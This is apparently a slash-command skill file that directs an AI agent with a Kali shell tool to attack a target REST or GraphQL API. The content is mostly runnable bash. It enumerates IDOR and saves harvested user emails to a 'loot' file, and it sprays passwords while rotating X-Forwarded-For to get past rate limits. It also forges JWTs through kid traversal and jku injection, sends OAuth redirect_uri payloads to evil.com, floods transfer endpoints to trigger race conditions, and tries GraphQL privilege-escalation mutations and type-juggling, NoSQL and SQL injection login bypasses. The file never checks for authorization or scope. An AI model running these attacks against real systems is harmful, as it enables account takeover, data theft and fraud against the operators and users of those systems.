---
description: Dedicated REST/GraphQL API pentesting — Swagger/OpenAPI discovery, auth bypass, mass IDOR scan, verb tampering, rate limiting, business logic, GraphQL deep-dive
argument-hint: <base-api-url> [auth-token]
allowed-tools: [mcp__kali-pentest__execute_kali_command]
---

# pt-api — REST/GraphQL API Penetration Tester

You are an expert API security researcher. Systematically attack the full API attack surface: discover all endpoints, test every auth bypass pattern, enumerate IDOR across all object types, probe every verb, and dig deep into GraphQL if present.

**This skill covers the proactive API surface that `/pt` handles reactively. Use `/pt-api` when you have a target API and want systematic enumeration first, then use `/pt` with your findings to go deeper.**

---

## Step 0 — Parse Arguments & Read Context

`$ARGUMENTS` = `<base-api-url> [auth-token]`
- `BASE_URL` = first word (e.g. `https://api.target.com`)
- `TOKEN` = second word if present (e.g. `eyJhbGc...`)
- Extract `TARGET` from BASE_URL (hostname only)

Read existing engagement context:
```bash
cat /home/kali/current/notes/engagement.md 2>/dev/null | head -60 || echo "[no active engagement]"
ls /home/kali/current/poc/requests/ 2>/dev/null
```

If no token provided, note: "No auth token — will test unauthenticated access first, then remind user to provide a token for authenticated testing."

---

## Phase 1 — API Endpoint Discovery

```bash
BASE_URL=<base_url>
TOKEN=<token_or_empty>
TARGET=$(echo $BASE_URL | sed 's|https\?://||; s|/.*||')
ENG=/home/kali/current
AUTH_HEADER="${TOKEN:+-H \"Authorization: Bearer $TOKEN\"}"

echo "=== [1/6] API Documentation Discovery ==="
echo "Testing for exposed API documentation and schemas..."
echo ""

for path in \
    /swagger-ui.html /swagger-ui/ /swagger.json /swagger.yaml \
    /api-docs /api-docs.json /api/docs \
    /openapi.json /openapi.yaml /openapi \
    /v1/api-docs /v2/api-docs /v3/api-docs \
    /api/swagger /api/swagger.json /api/openapi \
    /docs /api/docs /documentation \
    /redoc /rapidoc \
    /.well-known/openapi \
    /api/schema /schema.json; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL$path" ${TOKEN:+-H "Authorization: Bearer $TOKEN"})
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  $code  $BASE_URL$path"
done

echo ""
echo "=== GraphQL endpoint detection ==="
for path in /graphql /graphiql /api/graphql /query /gql /v1/graphql /graph /graphql/v1; do
    result=$(curl -sk -X POST "$BASE_URL$path" \
        -H "Content-Type: application/json" \
        ${TOKEN:+-H "Authorization: Bearer $TOKEN"} \
        -d '{"query":"{__typename}"}' 2>/dev/null)
    echo "$result" | grep -qi "typename\|data\|errors" && echo "  [GraphQL] $BASE_URL$path → $(echo $result | head -c 60)"
done

echo ""
echo "=== WSDL / SOAP discovery ==="
for path in /wsdl /service.wsdl /api.wsdl /services /soap /ws; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL$path?wsdl")
    [ "$code" = "200" ] && echo "  [SOAP] $BASE_URL$path?wsdl → 200"
done
```

---

## Phase 2 — Authentication Bypass Testing

```bash
BASE_URL=<base_url>
TOKEN=<token>
TARGET=$(echo $BASE_URL | sed 's|https\?://||; s|/.*||')

echo "=== [2/6] Authentication Bypass ==="
echo ""

# Discover some authenticated endpoints first
ENDPOINTS=("/api/users" "/api/v1/users" "/api/me" "/api/profile" "/api/admin/users" "/api/v1/admin" "/api/account")

for endpoint in "${ENDPOINTS[@]}"; do
    echo "--- Testing $endpoint ---"

    # 1. No auth at all
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL$endpoint")
    echo "  No auth:                    → $code"

    # 2. Null / undefined token
    for bad_token in "null" "undefined" "none" "false" "" "Bearer" "Bearer null" "Bearer undefined"; do
        code=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL$endpoint" \
            -H "Authorization: $bad_token" 2>/dev/null)
        [ "$code" != "401" ] && [ "$code" != "403" ] && [ "$code" != "000" ] && \
            echo "  Authorization: '$bad_token'  → $code [INTERESTING]"
    done

    # 3. Old API versions (often skip auth middleware)
    for v in v0 v1 v2 v3 v4 v5 v2018 v2019 v2020 v2021 v2022 v23 v24; do
        vpath=$(echo "$endpoint" | sed "s|/v[0-9]*\b|/$v|")
        [ "$vpath" = "$endpoint" ] && vpath="/api/$v${endpoint##/api}"
        code=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL$vpath" 2>/dev/null)
        [ "$code" = "200" ] || [ "$code" = "201" ] && echo "  [VERSION BYPASS] $vpath → $code"
    done
    echo ""
done
```

---

## Phase 3 — IDOR / BOLA Mass Enumeration

```bash
BASE_URL=<base_url>
TOKEN=<token>
ENG=/home/kali/current

echo "=== [3/6] IDOR / BOLA Mass Scan ==="
echo "Testing sequential and random IDs across object endpoints..."
echo ""

# Find your own user ID first
MY_PROFILE=$(curl -sk "$BASE_URL/api/me" -H "Authorization: Bearer $TOKEN" 2>/dev/null || \
             curl -sk "$BASE_URL/api/v1/me" -H "Authorization: Bearer $TOKEN" 2>/dev/null || \
             curl -sk "$BASE_URL/api/profile" -H "Authorization: Bearer $TOKEN" 2>/dev/null)
echo "Your profile: $(echo $MY_PROFILE | python3 -m json.tool 2>/dev/null | grep -E '"id"|"user_id"|"email"' | head -3)"
echo ""

# Common ID-based endpoints to fuzz
ID_ENDPOINTS=(
    "/api/users/ID"
    "/api/v1/users/ID"
    "/api/accounts/ID"
    "/api/orders/ID"
    "/api/invoices/ID"
    "/api/files/ID"
    "/api/documents/ID"
    "/api/admin/users/ID"
    "/api/v1/profile/ID"
)

for endpoint_template in "${ID_ENDPOINTS[@]}"; do
    echo "--- $endpoint_template ---"
    HIT=0
    for id in 1 2 3 10 100 1000 $(shuf -i 1-99999 -n 3 2>/dev/null); do
        endpoint="${endpoint_template/ID/$id}"
        resp=$(curl -sk "$BASE_URL$endpoint" -H "Authorization: Bearer $TOKEN" 2>/dev/null)
        code=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL$endpoint" -H "Authorization: Bearer $TOKEN" 2>/dev/null)
        if [ "$code" = "200" ] || [ "$code" = "201" ]; then
            email=$(echo "$resp" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('email',''))" 2>/dev/null)
            uid=$(echo "$resp" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('id',''))" 2>/dev/null)
            echo "  [HIT] id=$id → HTTP $code | id=$uid email=$email"
            HIT=1
            # Save to loot if we get data
            [ -n "$email" ] && echo "$id,$uid,$email" >> $ENG/loot/idor_users.csv 2>/dev/null
        fi
    done
    [ "$HIT" = "0" ] && echo "  no hits on tested IDs"
    echo ""
done

echo "[idor] hits saved → $ENG/loot/idor_users.csv"
```

---

## Phase 4 — HTTP Verb Tampering

```bash
BASE_URL=<base_url>
TOKEN=<token>

echo "=== [4/6] HTTP Verb Tampering ==="
echo "Testing all HTTP methods on each endpoint..."
echo ""

ENDPOINTS=(
    "/api/users"
    "/api/v1/users"
    "/api/admin"
    "/api/admin/users"
    "/api/users/1"
    "/api/settings"
    "/api/export"
    "/api/logs"
    "/api/debug"
    "/api/config"
)

for endpoint in "${ENDPOINTS[@]}"; do
    echo "--- $BASE_URL$endpoint ---"
    for method in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE CONNECT; do
        code=$(curl -sk -X $method "$BASE_URL$endpoint" \
            ${TOKEN:+-H "Authorization: Bearer $TOKEN"} \
            -H "Content-Type: application/json" \
            -o /dev/null -w "%{http_code}" 2>/dev/null)
        # Flag interesting codes (200/201/204 = accessible, 405 = exists but blocked, 500 = error worth noting)
        case "$code" in
            200|201|204) echo "  $method → $code [ACCESSIBLE]" ;;
            405) echo "  $method → $code (method not allowed — endpoint exists)" ;;
            500|502|503) echo "  $method → $code [SERVER ERROR — possible injection point]" ;;
        esac
    done
    echo ""
done
```

---

## Phase 5 — Rate Limiting & Brute Force Surface

```bash
BASE_URL=<base_url>
TOKEN=<token>

echo "=== [5/6] Rate Limiting Assessment ==="
echo ""

# Find the login endpoint
for login_path in /api/login /api/auth/login /api/v1/login /api/authenticate /auth/token /api/token /oauth/token /api/auth; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$BASE_URL$login_path" \
        -H "Content-Type: application/json" \
        -d '{"email":"test@test.com","password":"wrongpassword"}' 2>/dev/null)
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  Login endpoint candidate: $BASE_URL$login_path → $code"
done

echo ""
echo "=== 15 rapid invalid login attempts (baseline) ==="
WRONG_CODES=""
for i in $(seq 1 15); do
    code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$BASE_URL/api/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"test@test.com","password":"wrongpassword"}')
    WRONG_CODES="$WRONG_CODES $code"
done
echo "  Codes: $WRONG_CODES"
echo "  $(echo $WRONG_CODES | grep -oc '429') × 429 (rate limited)"
echo "  $(echo $WRONG_CODES | grep -oc '200') × 200 [NO RATE LIMITING DETECTED]"

echo ""
echo "=== Rate limit bypass: X-Forwarded-For rotation ==="
for i in $(seq 1 5); do
    code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$BASE_URL/api/login" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: 10.0.0.$i" \
        -H "X-Real-IP: 10.0.0.$i" \
        -d '{"email":"test@test.com","password":"wrongpassword"}' 2>/dev/null)
    echo "  X-Forwarded-For: 10.0.0.$i → $code"
done

echo ""
echo "=== JSON array password spray ==="
curl -sk -X POST "$BASE_URL/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com","password":["password","Password1","admin","123456","Admin123!","Welcome1"]}' \
    2>/dev/null | python3 -m json.tool 2>/dev/null | head -10
```

---

## Phase 6 — GraphQL Deep Dive (if discovered in Phase 1)

Run this phase only if a GraphQL endpoint was found. Replace `$GRAPHQL_URL` with the discovered URL.

```bash
BASE_URL=<base_url>
TOKEN=<token>
GRAPHQL_URL=<graphql_endpoint>
ENG=/home/kali/current

echo "=== [6/6] GraphQL Security Testing ==="
echo ""

# Full schema introspection
echo "--- Schema introspection ---"
curl -sk -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    ${TOKEN:+-H "Authorization: Bearer $TOKEN"} \
    -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name kind ofType { name } } } type { name kind } } } } }"}' \
    | python3 -m json.tool 2>/dev/null \
    | tee $ENG/scans/nuclei/graphql_schema.json | head -60

echo ""
echo "--- Type listing ---"
curl -sk -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    ${TOKEN:+-H "Authorization: Bearer $TOKEN"} \
    -d '{"query":"{ __schema { types { name kind } } }"}' \
    | python3 -c "
import json,sys
data = json.load(sys.stdin)
types = [t['name'] for t in data.get('data',{}).get('__schema',{}).get('types',[])
         if not t['name'].startswith('__') and t['kind'] in ['OBJECT','INPUT_OBJECT']]
print('User-defined types:')
for t in sorted(types): print(f'  {t}')
" 2>/dev/null

echo ""
echo "--- IDOR via alias batching ---"
curl -sk -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    ${TOKEN:+-H "Authorization: Bearer $TOKEN"} \
    -d '{"query":"{ u1:user(id:1){id email role} u2:user(id:2){id email role} u3:user(id:3){id email role} u4:user(id:4){id email role} u5:user(id:5){id email role} u6:user(id:6){id email role} u7:user(id:7){id email role} u8:user(id:8){id email role} u9:user(id:9){id email role} u10:user(id:10){id email role} }"}' \
    | python3 -m json.tool 2>/dev/null

echo ""
echo "--- Mutation privilege escalation ---"
for mutation in \
    '{"query":"mutation { updateUser(id:2, role:\"admin\") { id role } }"}' \
    '{"query":"mutation { updateUserRole(userId:2, role:\"ADMIN\") { success } }"}' \
    '{"query":"mutation { promoteUser(id:2) { id isAdmin } }"}'; do
    result=$(curl -sk -X POST "$GRAPHQL_URL" \
        -H "Content-Type: application/json" \
        ${TOKEN:+-H "Authorization: Bearer $TOKEN"} \
        -d "$mutation" 2>/dev/null)
    echo "$result" | grep -qiv "error\|Cannot query\|null" && \
        echo "[MUTATION HIT] $mutation → $(echo $result | head -c 100)"
done

echo ""
echo "--- Field suggestion attack (bypass disabled introspection) ---"
curl -sk -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    ${TOKEN:+-H "Authorization: Bearer $TOKEN"} \
    -d '{"query":"{ us }"}' 2>/dev/null | grep -i "suggest\|Did you mean" | head -5

echo ""
echo "--- Batch query abuse (N+1 / DoS) ---"
BATCH='['
for i in $(seq 1 20); do
    BATCH="${BATCH}{\"query\":\"{ user(id:$i) { email } }\"},"
done
BATCH="${BATCH%,}]"
curl -sk -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    ${TOKEN:+-H "Authorization: Bearer $TOKEN"} \
    -d "$BATCH" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -30

echo ""
echo "--- Subscription endpoint probe ---"
curl -sk -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    ${TOKEN:+-H "Authorization: Bearer $TOKEN"} \
    -d '{"query":"subscription { userCreated { id email } }"}' 2>/dev/null | head -5
```

---

## Phase 7 — Advanced Authentication Attacks (JWT / OAuth / Race Conditions)

### JWT kid / jku Injection

```bash
BASE_URL=<base_url>
TOKEN=<token>
ENG=/home/kali/current

echo "=== Advanced JWT Attacks ==="

# First decode the JWT header to see algorithm and kid/jku fields
python3 /opt/jwt_tool/jwt_tool.py $TOKEN 2>/dev/null | head -30
echo ""

# kid path traversal — sign with empty secret by pointing kid to /dev/null
echo "--- kid path traversal (sign with '' empty secret) ---"
python3 /opt/jwt_tool/jwt_tool.py $TOKEN -I -pc kid -pv "../../dev/null" -S hs256 -p "" 2>/dev/null | \
    grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' | head -1 | \
    while read forged; do
        echo "Testing forged token: ${forged:0:40}..."
        curl -sk -H "Authorization: Bearer $forged" "$BASE_URL/api/me" 2>/dev/null | \
            python3 -m json.tool 2>/dev/null | head -10
    done

echo ""
echo "--- jku header injection --- "
echo "Host a malicious JWKS file (set up HTTP server first):"
echo "  1. Generate keypair: openssl genrsa -out /tmp/jwt.key 2048 && openssl rsa -in /tmp/jwt.key -pubout -out /tmp/jwt.pub"
echo "  2. Host JWKS: python3 -m http.server 8888 -d /tmp/"
echo "  3. Run: python3 /opt/jwt_tool/jwt_tool.py \$TOKEN --exploit ki -ju http://\$KALI_IP:8888/jwks.json"

echo ""
echo "--- RS256 → HS256 confusion (if public key obtainable) ---"
# Sometimes /jwks.json or /.well-known/jwks.json exposes the public key
curl -sk "$BASE_URL/.well-known/jwks.json" 2>/dev/null | python3 -m json.tool | head -20
curl -sk "$BASE_URL/api/auth/.well-known/jwks.json" 2>/dev/null | head -5
```

### OAuth / Authorization Code Flow Abuse

```bash
BASE_URL=<base_url>
AUTH_URL=<auth_endpoint>  # e.g. https://target.com/oauth/authorize
CID=<client_id>
ENG=/home/kali/current

echo "=== OAuth Flow Abuse ==="

# redirect_uri manipulation — open redirect to steal code
echo "--- redirect_uri bypass patterns ---"
for redirect in \
    "https://evil.com" \
    "https://evil.com@${BASE_URL#https://}" \
    "${BASE_URL}/callback%0d%0aLocation:https://evil.com" \
    "https://${BASE_URL#https://}.evil.com" \
    "javascript:alert(1)"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$redirect'))" 2>/dev/null)
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
        "${AUTH_URL}?response_type=code&client_id=${CID}&redirect_uri=${encoded}&state=x" 2>/dev/null)
    echo "  redirect_uri=$redirect → $code"
done

echo ""
echo "--- state parameter CSRF test ---"
# Two parallel auth flows with same state — check if both codes work
AUTH_LINK="${AUTH_URL}?response_type=code&client_id=${CID}&redirect_uri=${BASE_URL}/callback&state=fixedstate"
echo "CSRF test URL (use same 'state' in two sessions): $AUTH_LINK"

echo ""
echo "--- Authorization code replay (use same code twice) ---"
echo "After obtaining a code, attempt to exchange it twice:"
echo "  POST $BASE_URL/oauth/token  grant_type=authorization_code&code=CODE&redirect_uri=..."
echo "  Second exchange should return 'invalid_grant' or 'code already used'"
```

### Race Conditions

```bash
BASE_URL=<base_url>
TOKEN=<token>
ENG=/home/kali/current

echo "=== Race Condition Testing ==="

# Identify race-condition-prone endpoints
echo "--- Candidate endpoints ---"
for endpoint in /api/redeem /api/coupon /api/vote /api/like /api/transfer \
                /api/purchase /api/apply-discount /api/claim /api/order; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$BASE_URL$endpoint" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d '{"code":"TEST"}' 2>/dev/null)
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  $endpoint → $code [TEST THIS]"
done

echo ""
echo "--- Race coupon/voucher endpoint (20 simultaneous requests) ---"
# Replace /api/redeem and payload with actual endpoint and body
echo "Running 20 parallel requests to detect race condition..."
for i in $(seq 1 20); do
    curl -sk -o /dev/null -w "$i:%{http_code}\n" \
        -X POST "$BASE_URL/api/redeem" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"code":"SAVE50"}' &
done
wait

echo ""
echo "--- Race transfer/payment endpoint ---"
for i in $(seq 1 20); do
    curl -sk -o /dev/null -w "$i:%{http_code}\n" \
        -X POST "$BASE_URL/api/transfer" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"amount":100,"to_account":"victim_id"}' &
done
wait
echo ""
echo "Count 200 responses: >1 means race window exists (coupon applied multiple times, balance debited once)"
```

---

## Phase 8 — Business Logic Testing

```bash
BASE_URL=<base_url>
TOKEN=<token>

echo "=== Business Logic ==="
echo ""

# Negative values (price/quantity manipulation)
echo "--- Negative value probes ---"
for endpoint in /api/cart /api/orders /api/purchase /api/checkout /api/v1/cart; do
    curl -sk -X POST "$BASE_URL$endpoint" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"item_id":1,"quantity":-1,"price":-9999}' 2>/dev/null \
        | python3 -m json.tool 2>/dev/null | head -10
done

# Integer overflow
echo ""
echo "--- Integer overflow probes ---"
curl -sk -X POST "$BASE_URL/api/cart" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"quantity":2147483648}' 2>/dev/null | head -5

# Coupon/promo code reuse
echo ""
echo "--- Discount code abuse ---"
for code in "ADMIN" "DEBUG" "TEST100" "EMPLOYEE" "FREE" "INTERNAL"; do
    result=$(curl -sk -X POST "$BASE_URL/api/apply-coupon" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"code\":\"$code\"}" 2>/dev/null)
    echo "$result" | grep -qi "success\|discount\|applied" && echo "  [COUPON HIT] $code → $result"
done

# Password reset flow abuse
echo ""
echo "--- Password reset token reuse ---"
curl -sk -X POST "$BASE_URL/api/password-reset" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com"}' 2>/dev/null | head -5
```

### Phase 8b — JSON Type Coercion / Type Juggling

Many server-side frameworks use loose type comparison. Sending the wrong JSON type for a field can bypass authentication, skip validation, or manipulate prices.

```bash
BASE_URL=<base_url>
TOKEN=<token>

echo "=== JSON Type Coercion Attacks ==="
echo ""

echo "--- Auth bypass: boolean password (PHP loose == , Ruby == ) ---"
# Server: password == request.password → true == "anything" = true in PHP
curl -sk -X POST "$BASE_URL/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com","password":true}' 2>/dev/null | head -5

curl -sk -X POST "$BASE_URL/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com","password":1}' 2>/dev/null | head -5

echo ""
echo "--- Auth bypass: null/empty types ---"
curl -sk -X POST "$BASE_URL/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com","password":null}' 2>/dev/null | head -5

curl -sk -X POST "$BASE_URL/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com","password":[]}' 2>/dev/null | head -5

echo ""
echo "--- Array injection (some frameworks use first element) ---"
# Bypass: if server does user = find_by_email(params[:email]) where email is array
curl -sk -X POST "$BASE_URL/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":["admin@target.com","attacker@evil.com"],"password":"wrong"}' 2>/dev/null | head -5

curl -sk -X POST "$BASE_URL/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":{"$gt":""},"password":{"$gt":""}}' 2>/dev/null | head -5  # NoSQL hybrid

echo ""
echo "--- Price field type confusion ---"
# String "0" where integer 0 expected — some validators check type, skip value check
for endpoint in /api/cart /api/purchase /api/checkout; do
    curl -sk -X POST "$BASE_URL$endpoint" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"item_id":1,"price":"0","quantity":"1"}' 2>/dev/null | head -5
    curl -sk -X POST "$BASE_URL$endpoint" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"item_id":1,"price":false,"quantity":true}' 2>/dev/null | head -5
done

echo ""
echo "--- Numeric string SQLi in JSON body (some ORMs pass raw JSON values) ---"
# When server takes JSON and passes to SQL without parameterization
curl -sk -X POST "$BASE_URL/api/cart" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"item_id":"1 OR 1=1","quantity":"1 UNION SELECT 1,2,3--"}' 2>/dev/null | head -5

echo ""
echo "--- Parameter pollution via duplicate JSON keys ---"
# Some parsers use last key, some use first — test for inconsistency
curl -sk -X POST "$BASE_URL/api/transfer" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"amount":100,"amount":0.01}' 2>/dev/null | head -5  # server records 100, bank charges 0.01?
```

**Impact gate**: Authentication bypass → **Critical**. Price manipulation (accepted as valid order) → **High**. Type confusion in non-auth context → **Medium** (depends on business impact).

---

## Phase 9 — Summary & Attack Planning

After all phases complete, summarize:

```bash
ENG=/home/kali/current
echo ""
echo "=== pt-api Summary ==="
echo "Interesting findings to investigate with /pt:"
ls $ENG/loot/idor_users.csv 2>/dev/null && echo "  - IDOR hits found: $(wc -l < $ENG/loot/idor_users.csv) users enumerable"
echo ""
echo "Next steps:"
echo "  /pt \"<observations from above>\" — use signals found to run targeted attacks"
echo "  /pt-payloads \"<tech stack, input type, endpoint>\" — generate specific payloads"
echo "  /pt-report — generate professional report from all findings"
```

After completing all phases, present to the user:
1. All endpoints discovered (documented or undocumented)
2. Auth bypass results — any unauthenticated access?
3. IDOR hits — which object types are vulnerable?
4. Verb tampering findings — any unexpected verbs work?
5. Rate limiting — is the login endpoint protected?
6. GraphQL schema — what types/mutations exist?
7. Suggested `/pt` invocation based on what was found

---

## Execution Rules

- **Run all phases unless an endpoint type doesn't exist** (skip GraphQL phase if none found)
- **Save all interesting output** to `$ENG/poc/requests/` and `$ENG/loot/`
- **Present results progressively** — don't wait for all phases to complete
- **Chain findings immediately** — if IDOR found, note which GraphQL mutations or verbs could amplify it
- **Auth context**: If no token provided, run Phase 2 unauthenticated, then remind user to provide token for Phases 3-8
